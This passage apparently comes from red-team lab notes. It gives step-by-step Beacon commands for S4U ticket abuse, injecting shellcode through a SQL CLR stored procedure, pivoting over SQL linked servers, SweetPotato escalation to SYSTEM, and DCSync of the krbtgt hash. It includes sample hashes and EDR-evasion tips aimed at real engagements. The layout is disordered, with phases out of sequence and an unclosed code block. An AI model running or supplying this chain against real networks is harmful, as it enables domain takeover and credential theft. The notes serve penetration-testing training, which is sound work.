                          ↓ /altservice substitution
                          TGS for Administrator → cifs/lon-dc-1
\`\`\`

No constrained delegation config needed — the DC's TGT alone is sufficient.

## Phase 2 — Code Execution via SQL CLR

**TTP:** T1059.001 — Command and Scripting Interpreter: PowerShell (SQL CLR is a .NET execution primitive)
**TTP:** T1055 — Process Injection (shellcode injected into sqlservr.exe)

### What SQL CLR Is

SQL Server's Common Language Runtime integration allows .NET assemblies to be loaded as **stored procedures** that execute inside the SQL Server process (\`sqlservr.exe\`). Abusing this gives code execution in the context of the SQL service account.

### Enable CLR

\`\`\`bash
# Check current status
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
# Returns: 0 (disabled by default)

# Enable
sql-enableclr lon-db-1
\`\`\`

### Generate SMB Beacon Shellcode

\`\`\`
Payloads > Windows Stageless Payload
Listener:      smb
Output:        Raw
Exit Function: Thread
Save to:       C:\\Payloads\\smb_x64.xthread.bin
\`\`\`

> **Exit Function: Thread** — Beacon runs inside \`sqlservr.exe\`. Using \`Process\` would kill SQL Server when Beacon exits. \`Thread\` exits cleanly without affecting the host process.

### Build MyProcedure.dll

\`\`\`
Visual Studio → New Project → Class Library (.NET Framework)
Project name: MyProcedure
\`\`\`

Add \`smb_x64.xthread.bin\` as embedded resource (Properties → Build Action: Embedded Resource).

**What the CLR stored procedure does:**

\`\`\`csharp
1. Read embedded shellcode from assembly manifest resource
       ↓
2. VirtualAlloc(PAGE_EXECUTE_READWRITE) — allocate RWX memory
       ↓
3. WriteProcessMemory(-1, ...) — copy shellcode into allocated memory
       ↓
4. CreateThread(shellcode address) — execute shellcode in new thread
       ↓
5. CloseHandle(thread) — clean up handle
\`\`\`

> **OPSEC note:** \`PAGE_EXECUTE_READWRITE\` is a significant IOC — RWX memory allocation is heavily monitored by EDRs. In the lab this works because the Artifact Kit and Malleable C2 profile handle evasion at the Beacon level. On real engagements, consider RW→RX transition or indirect syscalls for the injection.

Build in **Release** mode → \`C:\\Users\\Attacker\\source\\repos\\MyProcedure\\bin\\Release\\MyProcedure.dll\`

### Load and Execute CLR Payload

\`\`\`bash
# Load DLL into lon-db-1 and execute MyProcedure stored procedure
sql-clr lon-db-1 C:\\Users\\Attacker\\source\\repos\\MyProcedure\\bin\\Release\\MyProcedure.dll MyProcedure
\`\`\`

### Link to the SMB Beacon

\`\`\`bash
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
\`\`\`

> **If you get ERROR_LOGON_FAILURE:** The \`link\` command requires SMB authentication to lon-db-1. You need either:
> - A TGT or CIFS service ticket in the current Beacon session, **OR**
> - Run \`link\` from a Beacon that already has a valid TGT (e.g. pchilds' Beacon — Windows will auto-request a CIFS TGS)
>
> The named pipe (\`TSVCPIPE-...\`) must match your SMB listener config exactly.

### Cleanup CLR

\`\`\`bash
sql-disableclr lon-db-1
\`\`\`

> Always disable CLR after use — leaving it enabled is a detectable configuration change and violates *primum non nocere*.

## Phase 3 — Lateral Movement via SQL Links

SQL Server linked servers allow queries to be forwarded from one SQL instance to another — a built-in SQL lateral movement primitive.

### Enumerate Links

\`\`\`bash
sql-links lon-db-1
# Returns: lon-db-2 (linked server)
\`\`\`

### Check Privileges on Linked Server

\`\`\`bash
sql-whoami lon-db-1 "" lon-db-2
# Third argument = linked server to proxy through
\`\`\`

### Enable RPC Out (Required for CLR Execution)

\`\`\`bash
# Check RPC Out status
sql-checkrpc lon-db-1

# Enable RPC Out on the link to lon-db-2
sql-enablerpc lon-db-1 lon-db-2
\`\`\`

> **RPC Out** must be enabled on the linked server config to execute stored procedures (CLR) remotely. Without it, only queries can be forwarded — not procedure execution.

### Execute CLR Payload on lon-db-2 via lon-db-1

\`\`\`bash
# Fourth argument = linked server target
sql-clr lon-db-1 C:\\Users\\Attacker\\source\\repos\\MyProcedure\\bin\\Release\\MyProcedure.dll MyProcedure "" lon-db-2
\`\`\`

### Link to lon-db-2 Beacon (from lon-db-1 Beacon)

\`\`\`bash
# From the lon-db-1 Beacon — lon-db-2 Beacon connects back through lon-db-1
link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
\`\`\`

### Cleanup RPC

\`\`\`bash
sql-disablerpc lon-db-1 lon-db-2
\`\`\`

**TTP:** T1134.002 — Access Token Manipulation: Create Process with Token
**TTP:** T1068 — Exploitation for Privilege Escalation

### Why This Works — SeImpersonatePrivilege

\`\`\`bash
whoami    # on lon-db-2 Beacon

SQL Server service accounts run with \`SeImpersonatePrivilege\` enabled — a Windows privilege that allows a process to impersonate any authentication token presented to it. This is the prerequisite for all "Potato" attacks.

**Potato attack chain:**
\`\`\`
SweetPotato triggers a privileged COM object authentication
    ↓
COM object authenticates to SweetPotato's fake server
    ↓
SweetPotato impersonates the SYSTEM token using SeImpersonatePrivilege
    ↓
Spawns our payload as SYSTEM

### Stage tcp-local Payload

\`\`\`bash
# Generate payload
Payloads > Windows Stageless Payload
Listener:  tcp-local    (port 1337, localhost only)
Save to:   C:\\Payloads\\tcp-local_x64.exe

# Change to SQL service profile AppData directory (writable by service account)
cd C:\\Windows\\ServiceProfiles\\MSSQLSERVER\\AppData\\Local\\Microsoft\\WindowsApps

# Upload
upload C:\\Payloads\\tcp-local_x64.exe
\`\`\`

> **Why this directory:** Writable by the MSSQL service account. \`C:\\Temp\` also works but this path is more consistent with legitimate SQL service file locations.

### Execute SweetPotato

\`\`\`bash
execute-assembly C:\\Tools\\SweetPotato\\bin\\Release\\SweetPotato.exe -p "C:\\Windows\\ServiceProfiles\\MSSQLSERVER\\AppData\\Local\\Microsoft\\WindowsApps\\tcp-local_x64.exe"
\`\`\`

### Connect to SYSTEM Beacon

\`\`\`bash
connect localhost 1337
\`\`\`

> \`tcp-local\` listener binds to \`127.0.0.1:1337\` only — the \`connect\` command tells the parent Beacon to connect to the child Beacon on localhost. No external connection, no new network traffic.

## Phase 1 — DCSync

**TTP:** T1003.006 — OS Credential Dumping: DCSync

### What DCSync Is

Domain Controllers replicate data between themselves using the **Directory Replication Service (DRS)** protocol. DCSync abuses this protocol to request replication data — specifically password hashes — from a DC, without touching LSASS on the DC itself.

**Requires:** Domain Admin, Enterprise Admin, or DC computer account privileges.

### Execute DCSync

\`\`\`bash
# Pull krbtgt hash — the crown jewel
dcsync contoso.com CONTOSO\\krbtgt

# Pull all hashes (full domain dump)
dcsync contoso.com
\`\`\`

### Output — Key Values to Capture

\`\`\`
SAM Username   : krbtgt
Hash NTLM      : 2d454c2120b54890b3db65406e5a5974
aes256_hmac    : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
aes128_hmac    : 90e173c1fedcdfeaeddb07e695b75cfa
\`\`\`

> **Always capture AES256** — it's required for Golden/Diamond tickets and is harder to detect than RC4/NTLM usage.

### Why krbtgt Is the Primary Target

The krbtgt secret encrypts and signs all TGTs in the domain. Possessing it means:
- Forge valid TGTs for any user (Golden Ticket)
- Forge valid TGTs that are indistinguishable from legitimate ones (Diamond Ticket)
- The hash is **never automatically rotated** by AD — it persists indefinitely until manually changed (requires two resets to fully invalidate)

### OPSEC — Detection

- DRS replication from a **non-DC IP** is the primary IOC — defenders alert on event ID \`4662\` with GUIDs:
  - \`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\` — DS-Replication-Get-Changes / DS-Replication-Get-Changes-All
  - \`89e95b76-444d-4c62-991a-0facbeda640c\` — DS-Replication-Get-Changes-In-Filtered-Set
- Legitimate DRS traffic originates from known DC IPs only — any replication request from a workstation or server IP is immediately suspicious
